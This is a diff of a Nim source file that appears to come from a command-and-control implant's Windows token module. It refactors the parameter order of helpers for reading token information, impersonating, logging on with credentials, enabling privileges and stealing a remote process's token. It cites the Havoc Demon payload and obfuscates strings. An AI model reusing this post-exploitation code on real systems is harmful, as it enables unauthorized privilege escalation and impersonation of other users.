@@ -70,12 +70,12 @@ proc getCurrentToken*(desiredAccess: ACCESS_MASK = TOKEN_QUERY): HANDLE =
 
     return hToken
 
-proc sidToString(apis: Apis, sid: PSID): string = 
+proc sidToString(sid: PSID, apis: Apis = initApis()): string = 
     var stringSid: LPSTR 
     discard apis.ConvertSidToStringSidA(sid, addr stringSid)
     return $stringSid
 
-proc sidToName*(sid: PSID): string = 
+proc sidToName(sid: PSID): string = 
     var 
         usernameSize: DWORD = 0
         domainSize: DWORD = 0
@@ -90,7 +90,7 @@ proc sidToName*(sid: PSID): string =
         return $domain[0 ..< int(domainSize)] & "\\" & $username[0 ..< int(usernameSize)]
     return ""
 
-proc privilegeToString(apis: Apis, luid: PLUID): string =
+proc privilegeToString(luid: PLUID): string =
     var privSize: DWORD = 0
 
     # Retrieve required size
@@ -104,7 +104,7 @@ proc privilegeToString(apis: Apis, luid: PLUID): string =
 #[
     Retrieve and return information about an access token
 ]#
-proc getTokenStatistics(apis: Apis, hToken: HANDLE): tuple[tokenId, tokenType: string] = 
+proc getTokenStatistics(hToken: HANDLE, apis: Apis = initApis()): tuple[tokenId, tokenType: string] = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -120,7 +120,7 @@ proc getTokenStatistics(apis: Apis, hToken: HANDLE): tuple[tokenId, tokenType: s
 
     return (tokenId, tokenType)
 
-proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] = 
+proc getTokenUser*(hToken: HANDLE, apis: Apis = initApis()): tuple[username, sid: string] = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -139,9 +139,9 @@ proc getTokenUser(apis: Apis, hToken: HANDLE): tuple[username, sid: string] =
     if status != STATUS_SUCCESS:
         raise newException(CatchableError, status.getNtError())
     
-    return (sidToName(pUser.User.Sid), apis.sidToString(pUser.User.Sid))
+    return (sidToName(pUser.User.Sid), sidToString(pUser.User.Sid, apis))
 
-proc getTokenElevation(apis: Apis, hToken: HANDLE): bool = 
+proc getTokenElevation(hToken: HANDLE, apis: Apis = initApis()): bool = 
     var 
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -153,7 +153,7 @@ proc getTokenElevation(apis: Apis, hToken: HANDLE): bool =
 
     return cast[bool](pElevation.TokenIsElevated)
 
-proc getTokenGroups(apis: Apis, hToken: HANDLE): string = 
+proc getTokenGroups(hToken: HANDLE, apis: Apis = initApis()): string = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -178,9 +178,9 @@ proc getTokenGroups(apis: Apis, hToken: HANDLE): string =
 
     result &= fmt"Group memberships ({groupCount})" & "\n"
     for i, group in groups.toOpenArray(0, int(groupCount) - 1): 
-        result &= fmt" - {apis.sidToString(group.Sid):<50} {sidToName(group.Sid)}" & "\n"
+        result &= fmt" - {sidToString(group.Sid, apis):<50} {sidToName(group.Sid)}" & "\n"
 
-proc getTokenPrivileges(apis: Apis, hToken: HANDLE): string = 
+proc getTokenPrivileges(hToken: HANDLE, apis: Apis = initApis()): string = 
     var
         status: NTSTATUS = 0
         returnLength: ULONG = 0
@@ -206,31 +206,31 @@ proc getTokenPrivileges(apis: Apis, hToken: HANDLE): string =
     result &= fmt"Privileges ({privCount})" & "\n"
     for i, priv in privs.toOpenArray(0, int(privCount) - 1):
         let enabled = if priv.Attributes and SE_PRIVILEGE_ENABLED: "Enabled" else: "Disabled" 
-        result &= fmt" - {apis.privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"
+        result &= fmt" - {privilegeToString(addr priv.Luid):<50} {enabled}" & "\n"
 
 
 proc getTokenInfo*(hToken: HANDLE): string = 
     let apis = initApis() 
 
-    let (tokenId, tokenType) = apis.getTokenStatistics(hToken)
+    let (tokenId, tokenType) = getTokenStatistics(hToken, apis)
     result &= fmt"TokenID:  0x{tokenId}" & "\n"
     result &= fmt"Type:     {tokenType}" & "\n"
  
-    let (username, sid) = apis.getTokenUser(hToken)
+    let (username, sid) = getTokenUser(hToken, apis)
     result &= fmt"User:     {username}" & "\n"
     result &= fmt"SID:      {sid}" & "\n"
     
-    let isElevated = apis.getTokenElevation(hToken)
+    let isElevated = getTokenElevation(hToken, apis)
     result &= fmt"Elevated: {$isElevated}" & "\n"
 
-    result &= apis.getTokenGroups(hToken    )
-    result &= apis.getTokenPrivileges(hToken)
+    result &= getTokenGroups(hToken, apis)
+    result &= getTokenPrivileges(hToken, apis)
 
 #[
     Impersonate token 
     - https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/Token.c#L1281
 ]#
-proc impersonate*(apis: Apis, hToken: HANDLE) = 
+proc impersonate*(hToken: HANDLE, apis: Apis = initApis()) = 
     var 
         status: NTSTATUS
         qos: SECURITY_QUALITY_OF_SERVICE
@@ -239,7 +239,7 @@ proc impersonate*(apis: Apis, hToken: HANDLE) =
         returnLength: ULONG = 0
         duplicated: bool = false 
 
-    if apis.getTokenStatistics(hToken).tokenType == protect("Primary"): 
+    if getTokenStatistics(hToken, apis).tokenType == protect("Primary"): 
         # Create a duplicate impersonation token
         qos.Length = cast[DWORD](sizeof(SECURITY_QUALITY_OF_SERVICE))
         qos.ImpersonationLevel = securityImpersonation
@@ -308,9 +308,9 @@ proc makeToken*(username, password, domain: string, logonType: DWORD = LOGON32_L
         raise newException(CatchableError, GetLastError().getError())
     defer: discard apis.NtClose(hToken)
     
-    apis.impersonate(hToken)
+    impersonate(hToken, apis)
 
-    return apis.getTokenUser(hToken).username
+    return getTokenUser(hToken, apis).username
 
 proc enablePrivilege*(privilegeName: string, enable: bool = true): string = 
     let apis = initApis()
@@ -338,7 +338,7 @@ proc enablePrivilege*(privilegeName: string, enable: bool = true): string =
         raise newException(CatchableError, status.getNtError())        
 
     let action = if enable: protect("Enabled") else: protect("Disabled")
-    return fmt"{action} {apis.privilegeToString(addr luid)}."
+    return fmt"{action} {privilegeToString(addr luid)}."
 
 #[
     Steal the access token of a remote process and impersonate it
@@ -375,6 +375,6 @@ proc stealToken*(pid: int): string =
         raise newException(CatchableError, status.getNtError())
     defer: discard apis.NtClose(hToken)
 
-    apis.impersonate(hToken)
+    impersonate(hToken, apis)
 
-    return apis.getTokenUser(hToken).username
+    return getTokenUser(hToken, apis).username
